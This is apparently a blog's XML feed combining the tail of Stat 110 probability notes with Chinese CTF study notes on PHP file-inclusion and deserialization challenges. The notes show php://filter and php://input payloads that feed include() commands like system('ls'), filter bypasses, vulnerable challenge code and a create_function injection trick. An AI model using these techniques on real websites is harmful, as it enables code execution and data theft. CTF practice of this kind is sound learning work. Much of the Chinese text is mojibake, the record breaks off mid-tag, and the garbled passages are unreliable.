when sampling without replacement â†’ Hypergeometric is correct.</p><h3 id="3-2-Continuous-basics"><a href="#3-2-Continuous-basics" class="headerlink" title="3.2 Continuous basics"></a>3.2 Continuous basics</h3><ul><li><strong>PDF</strong> $f$, <strong>CDF</strong> $F$. $P(a\le X\le b)&#x3D;\int_a^b f(x),dx$.</li><li><strong>LOTUS</strong> (a mustâ€‘know): $E[g(X)]&#x3D;\int g(x)f(x)dx$ (or $\sum g(x)p(x)$ discrete) â€” no need to compute distribution of $g(X)$.</li></ul><h4 id="Canonical-continuous-families"><a href="#Canonical-continuous-families" class="headerlink" title="Canonical continuous families"></a>Canonical continuous families</h4><ul><li><strong>Uniform(a,b):</strong> $f&#x3D;1&#x2F;(b-a)$, $E&#x3D;(a+b)&#x2F;2$.</li><li><strong>Exponential($\lambda$)</strong>: memoryless; $f&#x3D;\lambda e^{-\lambda x},1_{x\ge0}$; $E&#x3D;\tfrac1\lambda$, $\operatorname{Var}&#x3D;\tfrac1{\lambda^2}$.</li><li><strong>Normal($\mu,\sigma^2$)</strong>: $Z&#x3D;(X-\mu)&#x2F;\sigma\sim N(0,1)$. Sums&#x2F;affine transforms stay normal.</li><li><strong>Logistic($\mu,s$)</strong> (CDF $1&#x2F;(1+e^{-(x-\mu)&#x2F;s})$).</li></ul><p><strong>Transformations (Jacobian):</strong> If $Y&#x3D;g(X)$ bijective, $f_Y(y)&#x3D;f_X(g^{-1}(y)),\big|\frac{d}{dy}g^{-1}(y)\big|$. For vectors, use $|\det J_{g^{-1}}|$.</p><p><strong>Pitfall:</strong> forgetting absolute value of Jacobian; forgetting support mapping.</p><hr><h2 id="4-Joint-Distributions-Covariance-Convolution"><a href="#4-Joint-Distributions-Covariance-Convolution" class="headerlink" title="4. Joint Distributions, Covariance, Convolution"></a>4. Joint Distributions, Covariance, Convolution</h2><ul><li><strong>Joint PDF&#x2F;PMF</strong> $f_{X,Y}$; <strong>marginals</strong> by summing&#x2F;integrating over the other variable.</li><li><strong>Independence</strong> $\Leftrightarrow f_{X,Y}&#x3D;f_X f_Y$ (for densities&#x2F;pmfs).</li><li><strong>Covariance</strong>: $\operatorname{Cov}(X,Y)&#x3D;E[XY]-E[X]E[Y]$. If independent â†’ 0; converse may fail.</li><li><strong>Correlation</strong>: $\rho&#x3D;\tfrac{\operatorname{Cov}}{\sqrt{\operatorname{Var}X,\operatorname{Var}Y}}\in[-1,1]$.</li><li><strong>Convolution</strong> (sum): discrete $p_{X+Y}(z)&#x3D;\sum_x p_X(x)p_Y(z-x)$; continuous $f_{X+Y}(z)&#x3D;\int f_X(x)f_Y(z-x)dx$.</li></ul><p><strong>Pitfall:</strong> claiming zero covariance â‡’ independence (false except in special families e.g., jointly normal).</p><hr><h2 id="5-MGFs-Sums"><a href="#5-MGFs-Sums" class="headerlink" title="5. MGFs &amp; Sums"></a>5. MGFs &amp; Sums</h2><ul><li><strong>MGF</strong> $M_X(t)&#x3D;E[e^{tX}]$ (when it exists). Independent sums multiply MGFs.</li><li><strong>Poisson</strong>: $M(t)&#x3D;\exp(\lambda(e^t-1))$. <strong>Gamma($\alpha,\lambda$)</strong>: $M(t)&#x3D;(1-\tfrac{t}{\lambda})^{-\alpha}$.</li></ul><p><strong>Use:</strong> Identify distributions of sums; prove additivity (Poisson, Gamma with common rate, Normal).</p><p><strong>Pitfall:</strong> MGFs may not exist (e.g., Cauchy). Donâ€™t force it.</p><hr><h2 id="6-Special-Families-Order-Statistics"><a href="#6-Special-Families-Order-Statistics" class="headerlink" title="6. Special Families &amp; Order Statistics"></a>6. Special Families &amp; Order Statistics</h2><h3 id="6-1-Beta-Gamma"><a href="#6-1-Beta-Gamma" class="headerlink" title="6.1 Beta &amp; Gamma"></a>6.1 Beta &amp; Gamma</h3><ul><li><strong>Beta($\alpha,\beta$)</strong> on $(0,1)$: $f(x)\propto x^{\alpha-1}(1-x)^{\beta-1}$. Useful as a Binomial conjugate prior.</li><li><strong>Gamma($\alpha,\lambda$)</strong> on $(0,\infty)$: $f(x)&#x3D;\frac{\lambda^{\alpha}}{\Gamma(\alpha)}x^{\alpha-1}e^{-\lambda x}$.</li></ul><h3 id="6-2-Offshoots-of-the-Normal"><a href="#6-2-Offshoots-of-the-Normal" class="headerlink" title="6.2 Offshoots of the Normal"></a>6.2 Offshoots of the Normal</h3><ul><li><strong>Chiâ€‘square</strong>: sum of squares of iid $N(0,1)$. $\chi^2(k)\equiv\mathrm{Gamma}(k&#x2F;2,1&#x2F;2)$.</li><li><strong>t(k)</strong>: $Z&#x2F;\sqrt{W&#x2F;k}$ with $Z\sim N(0,1), W\sim\chi^2(k)$. Heavyâ€‘tailed; $t(1)&#x3D;$Cauchy.</li></ul><h3 id="6-3-Order-statistics"><a href="#6-3-Order-statistics" class="headerlink" title="6.3 Order statistics"></a>6.3 Order statistics</h3><ul><li>For iid with CDF $F$, $P(X_{(k)}\le x)&#x3D;\sum_{j&#x3D;k}^n \binom{n}{j}F(x)^j(1-F(x))^{n-j}$. Min&#x2F;max via $k&#x3D;1$ and $k&#x3D;n$.</li></ul><p><strong>Pitfall:</strong> confusing distribution of a quantile estimator with the quantile itself.</p><hr><h2 id="7-Inequalities-LLN-and-CLT"><a href="#7-Inequalities-LLN-and-CLT" class="headerlink" title="7. Inequalities, LLN, and CLT"></a>7. Inequalities, LLN, and CLT</h2><ul><li><p><strong>Markov:</strong> $P(X\ge a)\le E[X]&#x2F;a$ for $X\ge0$.</p></li><li><p><strong>Chebyshev:</strong> $P(|X-\mu|\ge k\sigma)\le 1&#x2F;k^2$.</p></li><li><p><strong>(Bonus) Chernoff&#x2F;Hoeffding:</strong> exponential tails for sums of bounded&#x2F;independent RVs.</p></li><li><p><strong>Weak LLN:</strong> sample mean $\bar X_n\to \mu$ in probability.</p></li><li><p><strong>Strong LLN:</strong> $\bar X_n\to \mu$ almost surely (mild conditions).</p></li><li><p><strong>CLT:</strong> $\tfrac{\sum_{i&#x3D;1}^n(X_i-\mu)}{\sigma\sqrt n}\Rightarrow N(0,1)$. Use for normal approximations (with continuity correction for discrete).</p></li></ul><p><strong>Pitfall:</strong> using CLT with tiny $n$ and highly skewed&#x2F;heavy tails.</p><hr><h2 id="8-Multivariate-Normal-MVN"><a href="#8-Multivariate-Normal-MVN" class="headerlink" title="8. Multivariate Normal (MVN)"></a>8. Multivariate Normal (MVN)</h2><ul><li>$\mathbf X\sim\mathrm{MVN}(\mu,\Sigma)$ iff every linear combination $a^T\mathbf X$ is normal.</li><li><strong>Key property:</strong> uncorrelated components â‡’ independent (special to MVN).</li><li><strong>MGF:</strong> $M_{\mathbf X}(\mathbf t)&#x3D;\exp(\mu^T\mathbf t+\tfrac12\mathbf t^T\Sigma\mathbf t)$.</li></ul><hr><h2 id="9-Markov-Chains-finiteâ€‘state"><a href="#9-Markov-Chains-finiteâ€‘state" class="headerlink" title="9. Markov Chains (finiteâ€‘state)"></a>9. Markov Chains (finiteâ€‘state)</h2><ul><li><strong>Markov property:</strong> $P(X_{n+1}&#x3D;j\mid \text{past})&#x3D;P(X_{n+1}&#x3D;j\mid X_n&#x3D;i)$.</li><li><strong>Transition matrix</strong> $P&#x3D;(p_{ij})$; $\pi$ stationary if $\pi^T P&#x3D;\pi^T$.</li><li><strong>Irreducible + aperiodic</strong> â‡’ unique stationary and $P^n\to 1\pi^T$.</li><li><strong>Reversible</strong> (detailed balance): $\pi_i p_{ij}&#x3D;\pi_j p_{ji}$.</li></ul><p><strong>Pitfall:</strong> confusing <em>stationary</em> with <em>limiting</em> distribution when the chain isnâ€™t ergodic.</p><hr><h2 id="10-Cauchy-the-friendly-monster"><a href="#10-Cauchy-the-friendly-monster" class="headerlink" title="10. Cauchy (the friendly monster)"></a>10. Cauchy (the friendly monster)</h2><ul><li><strong>PDF:</strong> $1&#x2F;(\pi(1+x^2))$. <strong>No</strong> mean&#x2F;variance; LLN fails. Useful counterexample in proofs.</li></ul><hr><h2 id="11-Sampling-Inverse-Probability-Weighting-IPW"><a href="#11-Sampling-Inverse-Probability-Weighting-IPW" class="headerlink" title="11. Sampling &amp; Inverse Probability Weighting (IPW)"></a>11. Sampling &amp; Inverse Probability Weighting (IPW)</h2><h3 id="11-1-Why-weights"><a href="#11-1-Why-weights" class="headerlink" title="11.1 Why weights?"></a>11.1 Why weights?</h3><p>When inclusion probabilities differ, naÃ¯ve sample means are biased for the population mean. <strong>Horvitzâ€“Thompson (HT)</strong> fixes this:</p><p>$\widehat{T}<em>{HT}&#x3D;\sum</em>{i\in S} \frac{Y_i}{\pi_i},\qquad \widehat{\mu}<em>{HT}&#x3D;\frac{1}{N}\sum</em>{i\in S}\frac{Y_i}{\pi_i}.$</p><ul><li>In <strong>SRS without replacement</strong> (sample size $n$ from $N$), $\pi_i&#x3D;n&#x2F;N$ so $w_i&#x3D;1&#x2F;\pi_i&#x3D;N&#x2F;n$ is constant â†’ HT reduces to the usual sample expansion.</li></ul><h3 id="11-2-â€œAll-weights-1-â‡’-estimate-must-be-too-large-â€-No"><a href="#11-2-â€œAll-weights-1-â‡’-estimate-must-be-too-large-â€-No" class="headerlink" title="11.2 â€œAll weights &gt; 1 â‡’ estimate must be too large?â€ (No.)"></a>11.2 â€œAll weights &gt; 1 â‡’ estimate must be too large?â€ (No.)</h3><p>Weights being &gt;1 just <em>scale up</em> each sampled unit to represent unsampled ones. Estimates can be high <strong>or</strong> low depending on which $Y_i$ happen to be sampled. Over many samples, HT is <strong>unbiased</strong>; direction of singleâ€‘sample error follows whether selected $Y$â€™s are above&#x2F;below population mean.</p><p><strong>Variance caution:</strong> IPW can <strong>inflate variance</strong> when some $\pi_i$ are tiny (huge weights). Stabilize via <strong>normalized weights</strong> or <strong>modelâ€‘assisted</strong> estimators.</p><p><strong>Oneâ€‘liner example (SRS, N&#x3D;5, n&#x3D;2):</strong> $\pi_i&#x3D;0.4, w&#x3D;2.5$. Draw {C&#x3D;6,E&#x3D;10} â‡’ expanded total 40 â‡’ mean 8 (too big this time). Draw {A&#x3D;2,B&#x3D;4} â‡’ mean 3 (too small). Across repeated samples, average back to true mean.</p><hr><h2 id="12-Worked-Microâ€‘Examples-quick-patterns"><a href="#12-Worked-Microâ€‘Examples-quick-patterns" class="headerlink" title="12. Worked Microâ€‘Examples (quick patterns)"></a>12. Worked Microâ€‘Examples (quick patterns)</h2><ol><li><p><strong>Convolution (Poisson):</strong> $X\sim\mathrm{Poi}(\lambda), Y\sim\mathrm{Poi}(\mu)$ indep â‡’ $X+Y\sim\mathrm{Poi}(\lambda+\mu)$. <em>Proof:</em> MGFs multiply.</p></li><li><p><strong>Transform (Exponentialâ†’Min):</strong> If $X_i\stackrel{iid}{\sim}\mathrm{Exp}(\lambda)$, then $X_{(1)}\sim \mathrm{Exp}(n\lambda)$. <em>Proof:</em> $P(X_{(1)}&gt;x)&#x3D;P(\cap_i{X_i&gt;x})&#x3D;e^{-n\lambda x}$.</p></li><li><p><strong>Bayes with partitions:</strong> Disease prevalence $\pi$, sensitivity $s$, specificity $c$: $P(D\mid +)&#x3D;\tfrac{s\pi}{s\pi+(1-c)(1-\pi)}$.</p></li><li><p><strong>CLT approximation (Binomial):</strong> $X\sim\mathrm{Bin}(n,p)$ â‡’ $P(X\le k)\approx \Phi\Big(\tfrac{k+0.5-np}{\sqrt{np(1-p)}}\Big)$.</p></li></ol><hr><h2 id="13-Common-Pitfalls-How-to-Selfâ€‘Check"><a href="#13-Common-Pitfalls-How-to-Selfâ€‘Check" class="headerlink" title="13. Common Pitfalls &amp; How to Selfâ€‘Check"></a>13. Common Pitfalls &amp; How to Selfâ€‘Check</h2><ul><li>Forgetting to <strong>condition on the mechanism</strong> (e.g., host policy in Monty Hall).</li><li>Using <strong>Binomial</strong> for withoutâ€‘replacement sampling (should be Hypergeometric).</li><li>Dropping <strong>absolute value</strong> in Jacobian.</li><li>Assuming <strong>zero covariance â‡’ independence</strong> (generally false).</li><li>Applying CLT with <strong>tiny n</strong> or <strong>infinite variance</strong> (Cauchy!).</li></ul><p><strong>Selfâ€‘check loop:</strong> Identify space â†’ model assumptions â†’ write primitives (pmf&#x2F;pdf&#x2F;cdf) â†’ use LOTUS&#x2F;conditioning â†’ sanity check limits (pâ†’0&#x2F;1, nâ†’âˆ) â†’ units&#x2F;support â†’ if sum&#x2F;transform, prefer MGF&#x2F;CGF&#x2F;Jacobian.</p><hr><h2 id="14-Mini-Formula-Sheet"><a href="#14-Mini-Formula-Sheet" class="headerlink" title="14. Mini Formula Sheet"></a>14. Mini Formula Sheet</h2><ul><li><strong>Bayes:</strong> $P(A\mid B)&#x3D;\frac{P(B\mid A)P(A)}{\sum_i P(B\mid A_i)P(A_i)}$.</li><li><strong>Linearity:</strong> $E\big[\sum a_i X_i\big]&#x3D;\sum a_i E[X_i]$.</li><li><strong>Var add (indep):</strong> $\operatorname{Var}(\sum X_i)&#x3D;\sum \operatorname{Var}(X_i)$.</li><li><strong>Convolution:</strong> discrete sum&#x2F;continuous integral.</li><li><strong>MGF mult:</strong> independence â‡’ multiply MGFs.</li><li><strong>Exponential memoryless:</strong> $P(X&gt;s+t\mid X&gt;s)&#x3D;P(X&gt;t)$.</li><li><strong>LLN&#x2F;CLT</strong> as above.</li></ul><hr><h3 id="Final-tip"><a href="#Final-tip" class="headerlink" title="Final tip"></a>Final tip</h3><p>When stuck: <strong>Condition on a good event</strong> (partition), <strong>apply LOTUS</strong>, or <strong>switch to MGFs</strong>. Draw a tree&#x2F;table; name every probability you write. If you canâ€™t state the model clearly, you canâ€™t compute correctly.</p><hr><p>2025&#x2F;8&#x2F;13 Harvard stat 110 notes, rewritten and structured for clarity and exam readiness by ChatGPT5.</p>]]></content>
      
      
      <categories>
          
          <category> æ•°å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¦‚ç‡è®º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ics-05_learned</title>
      <link href="/2025/08/03/ics-05-learned/"/>
      <url>/2025/08/03/ics-05-learned/</url>
      
        <content type="html"><![CDATA[<p>è§‚å¯Ÿåˆ°<code>page</code>æ˜¯ä¸€ä¸ªå¯æ§çš„postå‚æ•°ï¼Œé€šè¿‡<code>/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code>å¯ä»¥è¯»å–åˆ°<code>index.php</code>çš„å†…å®¹ã€‚</p><p><code>ctype_alnum($page)</code>å‡½æ•°ç”¨äºæ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦åªç”±å­—æ¯å’Œæ•°å­—ç»„æˆï¼Œå› æ­¤å¯ä»¥ç”¨æ¥å¯¹<code>page</code>å‚æ•°è¿›è¡Œåˆæ­¥çš„å®‰å…¨æ£€æŸ¥ã€‚</p><p><code>strpos($page, &#39;input&#39;) &gt; 0</code>å‡½æ•°ç”¨äºæ£€æŸ¥<code>page</code>å‚æ•°ä¸­æ˜¯å¦åŒ…å«å­—ç¬¦ä¸²<code>input</code>å‡ºç°çš„ç¬¬ä¸€ä¸ªåŒ¹é…çš„ä½ç½®ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›åŒ¹é…çš„ä½ç½®ï¼Œå¦åˆ™è¿”å›<code>false</code>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web_php_include_learned</title>
      <link href="/2025/08/02/Web-php-include-learned/"/>
      <url>/2025/08/02/Web-php-include-learned/</url>
      
        <content type="html"><![CDATA[<p><strong>æºä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="CHOICE-1"><a href="#CHOICE-1" class="headerlink" title="CHOICE 1"></a>CHOICE 1</h1><h2 id="strstr"><a href="#strstr" class="headerlink" title="strstr"></a>strstr</h2><p>The <code>strstr()</code> function in PHP is used to find the first occurrence of a string inside another string. Hereâ€™s how it works:</p><h3 id="Basic-Syntax"><a href="#Basic-Syntax" class="headerlink" title="Basic Syntax"></a>Basic Syntax</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strstr</span>(haystack, needle, before_needle)</span><br></pre></td></tr></table></figure><blockquote><p><strong>Parameters:</strong></p><ul><li><code>haystack</code> - The string to search in</li><li><code>needle</code> - The string to search for</li><li><code>before_needle</code> (optional) - If TRUE, returns the part before the first occurrence</li></ul><p><strong>Return Value:</strong></p><ul><li>Returns the portion of the string from the first occurrence of <code>needle</code> to the end</li><li>Returns <code>FALSE</code> if <code>needle</code> is not found</li></ul><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><p><strong>Basic usage:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$email</span> = <span class="string">&quot;user@example.com&quot;</span>;</span><br><span class="line"><span class="variable">$domain</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$email</span>, <span class="string">&#x27;@&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$domain</span>; <span class="comment">// Output: @example.com</span></span><br></pre></td></tr></table></figure><p><strong>Get part before the needle:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$email</span> = <span class="string">&quot;user@example.com&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$email</span>, <span class="string">&#x27;@&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span>; <span class="comment">// Output: user</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="str-replace-è¿‡æ»¤æ›¿æ¢"><a href="#str-replace-è¿‡æ»¤æ›¿æ¢" class="headerlink" title="str_replace è¿‡æ»¤æ›¿æ¢"></a>str_replace è¿‡æ»¤æ›¿æ¢</h2><p>ä½¿ç”¨å¤§å†™<code>PHP://</code>æ›¿æ¢å°å†™æˆ–ä½¿ç”¨<code>phpphp:////</code>æ‹¼æ¥ï¼ˆåŒå†™ç»•è¿‡ä½†æºç æœ‰å¾ªç¯é˜²å¾¡ï¼‰ã€‚</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><code>php://input</code> æ˜¯ä¸€ä¸ªåªè¯»æµï¼Œç”¨äºè·å–åŸå§‹ POST æ•°æ®ã€‚å®ƒå¯ä»¥ç”¨äºæ¥æ”¶ JSON æˆ– XML æ ¼å¼çš„æ•°æ®ï¼Œè€Œä¸éœ€è¦è§£æè¡¨å•æ•°æ®ã€‚</p><p>é€šè¿‡ <code>php://input</code> è·å¾— post æ•°æ®ç„¶å <code>include()</code> æ‰§è¡Œè¯¥æ•°æ®ï¼Œå¯ä»¥æ‰§è¡Œæƒ³è¦çš„æ¶æ„ä»£ç ã€‚</p><p>postman ä¸­ post æ¨¡å¼ï¼Œheaders é€‰æ‹© <code>Content-Type</code> ä¸º <code>application/x-www-form-urlencoded</code>ï¼Œbody ä¸­é€‰æ‹© rawï¼Œè¾“å…¥<code>system(&#39;ls)</code>ã€‚</p><p>è·å–ç›®å½•æ–‡ä»¶-&gt;è¾“å‡ºæ–‡ä»¶</p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpååºåˆ—åŒ–ç»ƒä¹ </title>
      <link href="/2025/08/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/"/>
      <url>/2025/08/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>å¦‚ä½•æŠŠå…¶ä»–æ–‡ä»¶è¾“å‡º highlight_file(â€˜flag.phpâ€™);</p><p>æœ€ç®€å•çš„ååºåˆ—åŒ–</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>æœ€ç®€å•çš„ååºåˆ—åŒ–</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span></span>&#123;</span><br><span class="line">   <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">   <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user==<span class="string">&quot;daydream&quot;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;pass==<span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">login</span>())</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>urlencode</p><ol><li>åœ¨æ”¶åˆ°è¯·æ±‚æ—¶ï¼ŒPHP å†…éƒ¨ä¼š <strong>è‡ªåŠ¨å¯¹ Cookie åšä¸€æ¬¡ç™¾åˆ†å·è§£ç ï¼ˆpercent-decodeï¼‰</strong>ï¼Œå†æŠŠç»“æœå¡«è¿› <code>$_COOKIE</code> è¶…å…¨å±€ï¼Œæ‰€ä»¥è„šæœ¬é‡Œçœ‹åˆ°çš„å·²ç»æ˜¯â€œè¿˜åŸå¥½â€çš„å­—ç¬¦ä¸²ã€‚</li></ol></li><li><p>PHP å¯¹ <code>$_GET</code> &#x2F; <code>$_POST</code> ä¹Ÿä¼šå…ˆåšåŒæ ·çš„è§£ç ï¼ˆåªæ˜¯ <code>+</code> åœ¨ query string ä¼šå˜ç©ºæ ¼ï¼‰ï¼›ä¿æŒè¡Œä¸ºä¸€è‡´æ›´æ˜“ç†è§£ã€‚</p></li></ol><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;key)();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;       <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;action;</span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br></pre></td></tr></table></figure><ol><li><p><code>creat_function()</code>: <code>create_function(string $args, string $code): string</code>. å®ƒå†…éƒ¨ä¼š <code>eval(&quot;function ($args) &#123; $code &#125;&quot;)</code> â€”â€” <strong>åœ¨åˆ›å»ºæ—¶å°±æ‰§è¡Œ <code>eval</code></strong>ã€‚</p><ol><li>å°†<code>$code</code>çš„é¦–å­—ç¬¦è®¾ä¸º<code>&#125;</code>ï¼Œè¿™æ˜¯ç»å…¸çš„ <strong><code>create_function</code> æ³¨å…¥æŠ€å·§</strong>ï¼š<ul><li><code>create_function(&#39;&#39;, &#39;â€¦ä»£ç â€¦&#39;)</code> ä¼šæ‹¼æˆï¼š<code>function () &#123; â€¦ä»£ç â€¦ &#125;</code></li><li>ä½ æŠŠ <code>code</code> è®¾ä¸º <code>&quot;&#125;...;//&quot;</code>ï¼Œ<strong>å…ˆé—­åˆ</strong>å‡½æ•°ä½“ï¼Œç„¶åæ’å…¥ä»»æ„ PHP è¯­å¥ï¼Œæœ€åç”¨æ³¨é‡Šåæ‰å°¾å·´ã€‚</li></ul></li></ol></li><li><p>PHP 7+ å…è®¸å¯¹â€œæ•°ç»„å‹ callableï¼ˆ<code>[$obj,&#39;method&#39;]</code>ï¼‰â€ç›´æ¥ç”¨ <code>()</code> è°ƒç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hi</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, <span class="subst">$name</span>\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span>   = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$cb</span>  = [<span class="variable">$d</span>, <span class="string">&#x27;hi&#x27;</span>];       <span class="comment">// æ•°ç»„å‹ callable</span></span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;Peter&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1) ä¼ ç»Ÿ</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$cb</span>, <span class="variable">$arg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2) PHP 7+ ç›´æ¥è°ƒç”¨</span></span><br><span class="line"><span 